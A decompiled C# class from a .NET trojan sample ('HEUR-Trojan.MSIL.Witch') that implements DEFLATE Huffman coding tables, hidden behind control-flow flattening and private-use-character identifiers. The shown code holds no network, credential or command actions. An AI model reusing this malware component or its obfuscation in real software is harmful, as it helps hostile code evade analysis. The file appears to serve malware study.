// Decompiled with JetBrains decompiler
// Type: 
// Assembly: honte, Version=1.3.1.2, Culture=neutral, PublicKeyToken=null
// MVID: 07496AF3-8F6C-A2E0-30EF-5C9917718EBE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan.MSIL.Witch.gen-8ccd2737842b65b2f0fd5418bbb2e17803cb1866860d679d6ef3b2b8acfc8b44.exe

using System;

internal sealed class \uE00B
{
  internal static \uE00D[] \uE004 = new \uE00D[288];
  internal static \uE00D[] \uE005 = new \uE00D[32];
  internal static \uE00F \uE006;
  internal static readonly int[] \uE007 = new int[19];
  internal static readonly int[] \uE008;
  internal static readonly int[] \uE009;
  internal static readonly int[] \uE00A;
  internal static readonly int[] \uE00B;

  static \uE00B()
  {
    \uE00B.\uE007[0] = 16;
    \uE00B.\uE007[1] = 17;
    \uE00B.\uE007[2] = 18;
    \uE00B.\uE007[4] = 8;
    \uE00B.\uE007[5] = 7;
    \uE00B.\uE007[6] = 9;
    \uE00B.\uE007[7] = 6;
    \uE00B.\uE007[8] = 10;
    \uE00B.\uE007[9] = 5;
    \uE00B.\uE007[10] = 11;
    \uE00B.\uE007[11] = 4;
    \uE00B.\uE007[12] = 12;
    \uE00B.\uE007[13] = 3;
    \uE00B.\uE007[14] = 13;
    \uE00B.\uE007[15] = 2;
    \uE00B.\uE007[16] = 14;
    \uE00B.\uE007[17] = 1;
    \uE00B.\uE007[18] = 15;
    \uE00B.\uE008 = new int[29];
    \uE00B.\uE008[0] = 3;
    \uE00B.\uE008[1] = 4;
    \uE00B.\uE008[2] = 5;
    \uE00B.\uE008[3] = 6;
    \uE00B.\uE008[4] = 7;
    \uE00B.\uE008[5] = 8;
    \uE00B.\uE008[6] = 9;
    \uE00B.\uE008[7] = 10;
    \uE00B.\uE008[8] = 11;
    \uE00B.\uE008[9] = 13;
    \uE00B.\uE008[10] = 15;
    \uE00B.\uE008[11] = 17;
    \uE00B.\uE008[12] = 19;
    \uE00B.\uE008[13] = 23;
    \uE00B.\uE008[14] = 27;
    \uE00B.\uE008[15] = 31;
    \uE00B.\uE008[16] = 35;
    \uE00B.\uE008[17] = 43;
    \uE00B.\uE008[18] = 51;
    \uE00B.\uE008[19] = 59;
    \uE00B.\uE008[20] = 67;
    \uE00B.\uE008[21] = 83;
    \uE00B.\uE008[22] = 99;
    \uE00B.\uE008[23] = 115;
    \uE00B.\uE008[24] = 131;
    \uE00B.\uE008[25] = 163;
    \uE00B.\uE008[26] = 195;
    \uE00B.\uE008[27] = 227;
    \uE00B.\uE008[28] = 258;
    \uE00B.\uE009 = new int[29];
    int index1 = 8;
    int num1 = 0;
    for (; index1 < 28; ++index1)
    {
      if (index1 % 4 == 0)
        ++num1;
      \uE00B.\uE009[index1] = num1;
    }
    \uE00B.\uE00A = new int[30];
    \uE00B.\uE00A[0] = 1;
    \uE00B.\uE00A[1] = 2;
    \uE00B.\uE00A[2] = 3;
    \uE00B.\uE00A[3] = 4;
    \uE00B.\uE00A[4] = 5;
    \uE00B.\uE00A[5] = 7;
    \uE00B.\uE00A[6] = 9;
    \uE00B.\uE00A[7] = 13;
    \uE00B.\uE00A[8] = 17;
    \uE00B.\uE00A[9] = 25;
    \uE00B.\uE00A[10] = 33;
    \uE00B.\uE00A[11] = 49;
    \uE00B.\uE00A[12] = 65;
    \uE00B.\uE00A[13] = 97;
    \uE00B.\uE00A[14] = 129;
    \uE00B.\uE00A[15] = 193;
    \uE00B.\uE00A[16] = 257;
    \uE00B.\uE00A[17] = 385;
    \uE00B.\uE00A[18] = 513;
    \uE00B.\uE00A[19] = 769;
    \uE00B.\uE00A[20] = 1025;
    \uE00B.\uE00A[21] = 1537;
    \uE00B.\uE00A[22] = 2049;
    \uE00B.\uE00A[23] = 3073;
    \uE00B.\uE00A[24] = 4097;
    \uE00B.\uE00A[25] = 6145;
    \uE00B.\uE00A[26] = 8193;
    \uE00B.\uE00A[27] = 12289;
    \uE00B.\uE00A[28] = 16385;
    \uE00B.\uE00A[29] = 24577;
    \uE00B.\uE00B = new int[30];
    int index2 = 4;
    int num2 = 0;
    for (; index2 < 30; ++index2)
    {
      if (index2 % 2 == 0)
        ++num2;
      \uE00B.\uE00B[index2] = num2;
    }
    for (int index3 = 0; index3 <= 143; ++index3)
    {
      \uE00B.\uE004[index3].\uE002 = 48 + index3;
      \uE00B.\uE004[index3].\uE003 = 8;
    }
    for (int index4 = 144; index4 <= (int) byte.MaxValue; ++index4)
    {
      \uE00B.\uE004[index4].\uE002 = 400 + index4 - 144;
      \uE00B.\uE004[index4].\uE003 = 9;
    }
    for (int index5 = 256; index5 <= 279; ++index5)
    {
      \uE00B.\uE004[index5].\uE002 = index5 - 256;
      \uE00B.\uE004[index5].\uE003 = 7;
    }
    for (int index6 = 280; index6 <= 287; ++index6)
    {
      \uE00B.\uE004[index6].\uE002 = 192 + index6 - 280;
      \uE00B.\uE004[index6].\uE003 = 8;
    }
    for (int index7 = 0; index7 <= 31; ++index7)
    {
      \uE00B.\uE005[index7].\uE002 = index7;
      \uE00B.\uE005[index7].\uE003 = 5;
    }
    \uE00B.\uE006 = \uE00B.\uE012(\uE00B.\uE004, \uE00B.\uE005);
  }

  internal static int \uE00E(int[] _param0, int[] _param1)
  {
    int num1 = 0;
label_2:
    int num2 = \uE010.\uE024(72);
    while (true)
    {
      int index;
      switch (num2)
      {
        case 0:
          index = 0;
          num2 = 2;
          continue;
        case 1:
label_4:
          num1 += _param0[index] * _param1[index];
          num2 = 3;
          continue;
        case 2:
          if (index != 0)
          {
            num2 = \uE010.\uE024(82);
            continue;
          }
          break;
        case 3:
          ++index;
          break;
        default:
          goto label_2;
      }
      if (index < _param0.Length)
        goto label_4;
      else
        break;
    }
    return num1;
  }

  internal static int \uE00F(int[] _param0, int[] _param1)
  {
    int num1 = 0;
label_2:
    int num2 = \uE010.\uE024(69);
    while (true)
    {
      int index;
      switch (num2)
      {
        case 0:
label_3:
          num1 += _param0[index] * \uE00B.\uE004[index].\uE003;
          num2 = \uE010.\uE024(70);
          continue;
        case 1:
          if (index != 0)
          {
            num2 = 0;
            continue;
          }
          break;
        case 2:
          index = 0;
          num2 = 1;
          continue;
        case 3:
          ++index;
          break;
        default:
          goto label_2;
      }
      if (index < _param0.Length)
        goto label_3;
      else
        break;
    }
label_10:
    int num3 = \uE010.\uE024(82);
    while (true)
    {
      int index;
      switch (num3)
      {
        case 0:
label_11:
          num1 += _param1[index] * \uE00B.\uE005[index].\uE003;
          num3 = 3;
          continue;
        case 1:
          index = 0;
          num3 = \uE010.\uE024(69);
          continue;
        case 2:
          if (index != 0)
          {
            num3 = 0;
            continue;
          }
          break;
        case 3:
          ++index;
          break;
        default:
          goto label_10;
      }
      if (index < _param1.Length)
        goto label_11;
      else
        break;
    }
    return num1;
  }

  internal static \uE00D[] \uE010(int[] _param0)
  {
    \uE00D[] objArray = new \uE00D[_param0.Length];
label_2:
    int num = \uE010.\uE024(69);
    while (true)
    {
      int index;
      switch (num)
      {
        case 0:
label_3:
          objArray[index].\uE003 = _param0[index];
          num = \uE010.\uE024(70);
          continue;
        case 1:
          if (index != 0)
          {
            num = 0;
            continue;
          }
          break;
        case 2:
          index = 0;
          num = 1;
          continue;
        case 3:
          ++index;
          break;
        default:
          goto label_2;
      }
      if (index < _param0.Length)
        goto label_3;
      else
        break;
    }
    \uE00B.\uE011(objArray);
    return objArray;
  }

  internal static void \uE011(\uE00D[] _param0)
  {
    int num1 = _param0[0].\uE003;
label_2:
    int num2 = \uE010.\uE024(69);
    while (true)
    {
      int index;
      switch (num2)
      {
        case 0:
          if (index == 0)
          {
            num2 = \uE010.\uE024(82);
            continue;
          }
          goto label_10;
        case 1:
label_5:
          if (num1 < _param0[index].\uE003)
          {
            num2 = 3;
            continue;
          }
          break;
        case 2:
          index = 1;
          num2 = 0;
          continue;
        case 3:
          num1 = _param0[index].\uE003;
          break;
        default:
          goto label_2;
      }
      ++index;
label_10:
      if (index < _param0.Length)
        goto label_5;
      else
        break;
    }
    int[] numArray1 = new int[num1 + 1];
label_13:
    int num3 = \uE010.\uE024(69);
    while (true)
    {
      int index;
      switch (num3)
      {
        case 0:
          if (index != 0)
          {
            num3 = 1;
            continue;
          }
          break;
        case 1:
label_16:
          ++numArray1[_param0[index].\uE003];
          num3 = 3;
          continue;
        case 2:
          index = 0;
          num3 = 0;
          continue;
        case 3:
          ++index;
          break;
        default:
          goto label_13;
      }
      if (index < _param0.Length)
        goto label_16;
      else
        break;
    }
    int[] numArray2 = new int[num1 + 1];
label_22:
    int num4 = \uE010.\uE024(70);
    while (true)
    {
      int index;
      int num5;
      switch (num4)
      {
        case 0:
          numArray2[index] = num5;
          num4 = 6;
          continue;
        case 1:
label_24:
          num5 = num5 + numArray1[index - 1] << 1;
          num4 = 0;
          continue;
        case 2:
          numArray1[0] = 0;
          num4 = 4;
          continue;
        case 3:
          num5 = 0;
          num4 = \uE010.\uE024(69);
          continue;
        case 4:
          index = 1;
          num4 = 5;
          continue;
        case 5:
          if (index == 0)
          {
            num4 = 1;
            continue;
          }
          break;
        case 6:
          ++index;
          break;
        default:
          goto label_22;
      }
      if (index <= num1)
        goto label_24;
      else
        break;
    }
    int index1 = 0;
    if (index1 == 0)
      goto label_36;
label_33:
    int index2 = _param0[index1].\uE003;
    if ((index2 == 0 ? 1 : 0) == 0)
    {
      _param0[index1].\uE002 = numArray2[index2];
      ++numArray2[index2];
    }
    ++index1;
label_36:
    if (index1 < _param0.Length)
      goto label_33;
  }

  internal static \uE00F \uE012(\uE00D[] _param0, \uE00D[] _param1) => new \uE00F()
  {
    \uE002 = \uE00B.\uE013(_param0),
    \uE003 = \uE00B.\uE013(_param1)
  };

  internal static \uE00E \uE013(\uE00D[] _param0)
  {
    \uE00B.\uE003[] objArray = new \uE00B.\uE003[_param0.Length];
label_2:
    int num1 = \uE010.\uE024(70);
    int num2;
    while (true)
    {
      int index;
      \uE00B.\uE003 obj;
      switch (num1)
      {
        case 0:
          index = 0;
          num1 = 4;
          continue;
        case 1:
          obj = new \uE00B.\uE003();
          num1 = 5;
          continue;
        case 2:
label_5:
          if (_param0[index].\uE003 > 0)
          {
            num1 = 1;
            continue;
          }
          break;
        case 3:
          num2 = 0;
          num1 = 0;
          continue;
        case 4:
          if (index != 0)
          {
            num1 = \uE010.\uE024(69);
            continue;
          }
          goto label_16;
        case 5:
label_11:
          int num3 = \uE010.\uE024(82);
          while (true)
          {
            switch (num3)
            {
              case 0:
                obj.\uE003 = (ushort) index;
                num3 = 2;
                continue;
              case 1:
                obj.\uE002 = _param0[index];
                num3 = 0;
                continue;
              case 2:
                goto label_14;
              default:
                goto label_11;
            }
          }
label_14:
          objArray[num2++] = obj;
          break;
        default:
          goto label_2;
      }
      ++index;
label_16:
      if (index < _param0.Length)
        goto label_5;
      else
        break;
    }
    return \uE00B.\uE014(objArray, num2, 0, 0);
  }

  private static \uE00E \uE014(
    \uE00B.\uE003[] _param0,
    int _param1,
    int _param2,
    int _param3)
  {
    \uE00B.\uE003[] objArray1 = new \uE00B.\uE003[_param1];
label_2:
    int num1 = \uE010.\uE024(76);
    \uE00E obj1;
    \uE00B.\uE003[] objArray2;
    int num2;
    int num3;
    while (true)
    {
      int index;
      \uE00B.\uE003 obj2;
      switch (num1)
      {
        case 0:
          if (index != 0)
          {
            num1 = 6;
            continue;
          }
          goto label_21;
        case 1:
          index = 0;
          num1 = 0;
          continue;
        case 2:
          obj1.\uE003 = obj2.\uE003;
          num1 = \uE010.\uE024(77);
          continue;
        case 3:
          if (obj2.\uE002.\uE003 == _param3)
          {
            num1 = 10;
            continue;
          }
          break;
        case 4:
          objArray2 = new \uE00B.\uE003[_param1];
          num1 = 9;
          continue;
        case 5:
          obj1.\uE002 = false;
          num1 = 8;
          continue;
        case 6:
label_11:
          obj2 = _param0[index];
          num1 = 3;
          continue;
        case 7:
          obj1.\uE002 = true;
          num1 = 2;
          continue;
        case 8:
          num3 = num2 = 0;
          num1 = 1;
          continue;
        case 9:
          obj1 = new \uE00E();
          num1 = 5;
          continue;
        case 10:
          if (obj2.\uE002.\uE002 == _param2)
          {
            num1 = 7;
            continue;
          }
          break;
        case 11:
label_20:
          ++index;
          goto label_21;
        default:
          goto label_2;
      }
      if (((obj2.\uE002.\uE002 >> obj2.\uE002.\uE003 - _param3 - 1 & 1) == 0 ? 1 : 0) == 0)
      {
        objArray2[num3++] = obj2;
        goto label_20;
      }
      else
      {
        objArray1[num2++] = obj2;
        goto label_20;
      }
label_21:
      if (index < _param1)
        goto label_11;
      else
        break;
    }
    if ((!obj1.\uE002 ? 0 : 1) == 0)
    {
      if (num2 > 0)
        obj1.\uE00C = \uE00B.\uE014(objArray1, num2, _param2 << 1, _param3 + 1);
      if (num3 > 0)
        obj1.\uE00D = \uE00B.\uE014(objArray2, num3, _param2 << 1 | 1, _param3 + 1);
    }
    return obj1;
  }

  internal static void \uE015(int _param0, out int _param1, out int _param2)
  {
    _param1 = \uE00B.\uE008[_param0 - 257];
    _param2 = \uE00B.\uE009[_param0 - 257];
  }

  internal static void \uE016(int _param0, out int _param1, out int _param2, out int _param3)
  {
    int index = Array.BinarySearch<int>(\uE00B.\uE008, _param0);
    if (index < 0)
      index = ~index - 1;
    _param1 = index + 257;
label_4:
    int num = \uE010.\uE024(82);
    while (true)
    {
      switch (num)
      {
        case 0:
          _param3 = \uE00B.\uE009[index];
          num = 2;
          continue;
        case 1:
          _param2 = _param0 - \uE00B.\uE008[index];
          num = 0;
          continue;
        case 2:
          goto label_7;
        default:
          goto label_4;
      }
    }
label_7:;
  }

  internal static void \uE017(int _param0, out int _param1, out int _param2, out int _param3)
  {
    int index = Array.BinarySearch<int>(\uE00B.\uE00A, _param0);
    if (index < 0)
      index = ~index - 1;
    _param1 = index;
label_4:
    int num = \uE010.\uE024(72);
    while (true)
    {
      switch (num)
      {
        case 0:
          _param2 = _param0 - \uE00B.\uE00A[index];
          num = 1;
          continue;
        case 1:
          _param3 = \uE00B.\uE00B[index];
          num = 2;
          continue;
        case 2:
          goto label_7;
        default:
          goto label_4;
      }
    }
label_7:;
  }

  internal static int[] \uE018(int[] _param0, int _param1) => \uE00B.\uE002.\uE01C(_param0, _param1);

  internal static int[] \uE019(int[] _param0) => \uE00B.\uE002.\uE01C(_param0, 15);

  internal static int \uE01A(int _param0)
  {
    switch (_param0)
    {
      case 16:
        return 2;
      case 17:
        return 3;
      case 18:
        return 7;
      default:
        return 0;
    }
  }

  internal static int[] \uE01B(int[] _param0, int _param1, int _param2)
  {
    \uE00C obj = new \uE00C();
    int num1 = 0;
    if (num1 == 0)
      goto label_41;
label_1:
    if ((_param0[_param1 + num1] == 0 ? 0 : 1) == 0)
    {
      int num2 = 0;
      int num3;
      do
      {
        ++num2;
label_5:
        int num4 = \uE010.\uE024(82);
        while (true)
        {
          switch (num4)
          {
            case 0:
              if (num2 < 138)
              {
                num4 = 2;
                continue;
              }
              goto label_15;
            case 1:
              if (num1 + num2 < _param2)
              {
                num4 = 0;
                continue;
              }
              goto label_15;
            case 2:
              if (_param0[_param1 + num1 + num2] != 0)
              {
                num4 = 3;
                continue;
              }
              goto label_13;
            case 3:
              goto label_12;
            default:
              goto label_5;
          }
        }
label_12:
        num3 = 0;
        goto label_14;
label_13:
        num3 = 1;
label_14:;
      }
      while (num3 != 0);
label_15:
      if (num2 < 3)
      {
        if (num2 >= 1)
          obj.\uE01F(0);
        if (num2 >= 2)
          obj.\uE01F(0);
      }
      else if (num2 < 11)
      {
        obj.\uE01F(17);
        obj.\uE01F(num2 - 3);
      }
      else
      {
        obj.\uE01F(18);
        obj.\uE01F(num2 - 11);
      }
      num1 += num2;
    }
    else
    {
      int num5 = _param0[_param1 + num1++];
label_26:
      int num6 = \uE010.\uE024(69);
      int num7;
      while (true)
      {
        switch (num6)
        {
          case 0:
            num7 = 0;
            num6 = 1;
            continue;
          case 1:
            if (num7 != 0)
            {
              num6 = 3;
              continue;
            }
            goto label_32;
          case 2:
            obj.\uE01F(num5);
            num6 = \uE010.\uE024(72);
            continue;
          case 3:
            goto label_31;
          default:
            goto label_26;
        }
      }
label_31:
      ++num7;
label_32:
      if (num1 + num7 < _param2 && num7 < 6)
      {
        if (_param0[_param1 + num1 + num7] == num5)
          goto label_31;
        else
          goto label_35;
      }
      else
        goto label_36;
label_34:
      int num8;
      while (true)
      {
        switch (num8)
        {
          case 0:
            goto label_36;
          case 1:
            obj.\uE01F(num7 - 3);
            num8 = 3;
            continue;
          case 2:
            obj.\uE01F(16);
            num8 = 1;
            continue;
          case 3:
            goto label_40;
          default:
            goto label_35;
        }
      }
label_40:
      num1 += num7;
      goto label_41;
label_35:
      num8 = \uE010.\uE024(72);
      goto label_34;
label_36:
      if (num7 >= 3)
      {
        num8 = \uE010.\uE024(69);
        goto label_34;
      }
    }
label_41:
    if (num1 >= _param2)
      return obj.\uE020();
    goto label_1;
  }

  private sealed class \uE002
  {
    internal static int[] \uE01C(int[] _param0, int _param1)
    {
      int[] items = new int[_param0.Length];
label_2:
      int num1 = \uE010.\uE024(82);
      int[] numArray1;
      while (true)
      {
        int index;
        switch (num1)
        {
          case 0:
label_3:
            items[index] = index;
            num1 = 4;
            continue;
          case 1:
            numArray1 = new int[_param0.Length];
            num1 = 2;
            continue;
          case 2:
            index = 0;
            num1 = 3;
            continue;
          case 3:
            if (index != 0)
            {
              num1 = \uE010.\uE024(72);
              continue;
            }
            break;
          case 4:
            ++index;
            break;
          default:
            goto label_2;
        }
        if (index < items.Length)
          goto label_3;
        else
          break;
      }
      Array.Copy((Array) _param0, (Array) numArray1, _param0.Length);
label_12:
      int num2 = \uE010.\uE024(69);
      int sourceIndex;
      while (true)
      {
        switch (num2)
        {
          case 0:
            if (sourceIndex != 0)
            {
              num2 = 3;
              continue;
            }
            goto label_18;
          case 1:
            sourceIndex = 0;
            num2 = 0;
            continue;
          case 2:
            Array.Sort<int, int>(numArray1, items);
            num2 = 1;
            continue;
          case 3:
            goto label_17;
          default:
            goto label_12;
        }
      }
label_17:
      ++sourceIndex;
label_18:
      if (sourceIndex >= numArray1.Length || (numArray1[sourceIndex] == 0 ? 1 : 0) == 0)
      {
        int[] destinationArray = new int[numArray1.Length - sourceIndex];
        Array.Copy((Array) numArray1, sourceIndex, (Array) destinationArray, 0, destinationArray.Length);
        int[] numArray2;
        if ((destinationArray.Length == 0 ? 0 : 1) == 0)
          numArray2 = new int[0];
        else if (destinationArray.Length == 1)
          numArray2 = new int[1]{ 1 };
        else
          numArray2 = \uE00B.\uE002.\uE01D(destinationArray, _param1);
        int[] numArray3 = new int[_param0.Length];
label_26:
        int num3 = \uE010.\uE024(82);
        while (true)
        {
          int index;
          switch (num3)
          {
            case 0:
              if (index != 0)
              {
                num3 = 2;
                continue;
              }
              break;
            case 1:
              index = 0;
              num3 = 0;
              continue;
            case 2:
label_30:
              numArray3[items[index + sourceIndex]] = numArray2[index];
              num3 = \uE010.\uE024(70);
              continue;
            case 3:
              ++index;
              break;
            default:
              goto label_26;
          }
          if (index < numArray2.Length)
            goto label_30;
          else
            break;
        }
        return numArray3;
      }
      goto label_17;
    }

    private static int[] \uE01D(int[] _param0, int _param1)
    {
      int length = _param0.Length;
label_2:
      int num1 = \uE010.\uE024(69);
      int[][] numArray1;
      int[] numArray2;
      while (true)
      {
        int index;
        switch (num1)
        {
          case 0:
            if (index != 0)
            {
              num1 = 3;
              continue;
            }
            break;
          case 1:
            numArray1[0] = _param0;
            num1 = 4;
            continue;
          case 2:
            numArray1 = new int[_param1][];
            num1 = \uE010.\uE024(82);
            continue;
          case 3:
label_7:
            numArray2[index] = _param0[index * 2] + _param0[index * 2 + 1];
            num1 = 6;
            continue;
          case 4:
            numArray2 = new int[_param0.Length / 2];
            num1 = 5;
            continue;
          case 5:
            index = 0;
            num1 = 0;
            continue;
          case 6:
            ++index;
            break;
          default:
            goto label_2;
        }
        if (index < numArray2.Length)
          goto label_7;
        else
          break;
      }
      int index1 = 1;
      if (index1 != 0)
        goto label_25;
label_13:
      int[] numArray3 = \uE00B.\uE002.\uE01E(numArray2, _param0);
label_15:
      int num2 = \uE010.\uE024(82);
      while (true)
      {
        int index2;
        switch (num2)
        {
          case 0:
label_16:
            numArray2[index2] = numArray3[index2 * 2] + numArray3[index2 * 2 + 1];
            num2 = \uE010.\uE024(74);
            continue;
          case 1:
            numArray1[index1] = numArray3;
            num2 = 4;
            continue;
          case 2:
            if (index2 != 0)
            {
              num2 = 0;
              continue;
            }
            break;
          case 3:
            index2 = 0;
            num2 = 2;
            continue;
          case 4:
            numArray2 = new int[numArray3.Length / 2];
            num2 = 3;
            continue;
          case 5:
            ++index2;
            break;
          default:
            goto label_15;
        }
        if (index2 < numArray2.Length)
          goto label_16;
        else
          break;
      }
      ++index1;
label_25:
      if (index1 >= _param1)
      {
        int[] numArray4 = new int[length];
label_28:
        int num3 = \uE010.\uE024(72);
        int num4;
        int index3;
        while (true)
        {
          switch (num3)
          {
            case 0:
              num4 = length - 1;
              num3 = 1;
              continue;
            case 1:
              index3 = _param1 - 1;
              num3 = 2;
              continue;
            case 2:
              goto label_38;
            default:
              goto label_28;
          }
        }
label_38:
        for (; index3 >= 0; --index3)
        {
          int[] numArray5 = numArray1[index3];
          int num5 = 0;
          int index4 = 0;
          int index5 = 0;
          if (index5 == 0)
            goto label_36;
label_32:
          if (index4 < _param0.Length && _param0[index4] == numArray5[index5])
          {
            ++numArray4[index4];
            ++index4;
          }
          else
            ++num5;
          ++index5;
label_36:
          if (index5 >= num4 * 2)
            num4 = num5;
          else
            goto label_32;
        }
        return numArray4;
      }
      goto label_13;
    }

    private static int[] \uE01E(int[] _param0, int[] _param1)
    {
      int[] numArray = new int[_param0.Length + _param1.Length];
label_2:
      int num1 = \uE010.\uE024(70);
      int num2;
      int index1;
      int index2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            numArray[num2++] = _param0[index1++];
            num1 = 6;
            continue;
          case 1:
            num2 = 0;
            num1 = 5;
            continue;
          case 2:
            index2 = 0;
            num1 = 1;
            continue;
          case 3:
            index1 = 0;
            num1 = \uE010.\uE024(69);
            continue;
          case 4:
            if (_param0[index1] < _param1[index2])
            {
              num1 = 0;
              continue;
            }
            numArray[num2++] = _param1[index2++];
            goto case 6;
          case 5:
            if (num2 != 0)
            {
              num1 = 4;
              continue;
            }
            goto case 6;
          case 6:
            if (index1 >= _param0.Length || index2 >= _param1.Length)
              goto label_14;
            else
              goto case 4;
          default:
            goto label_2;
        }
      }
label_14:
      while (index1 < _param0.Length)
        numArray[num2++] = _param0[index1++];
      while (index2 < _param1.Length)
        numArray[num2++] = _param1[index2++];
      return numArray;
    }
  }

  private struct \uE003
  {
    internal \uE00D \uE002;
    internal ushort \uE003;
  }
}
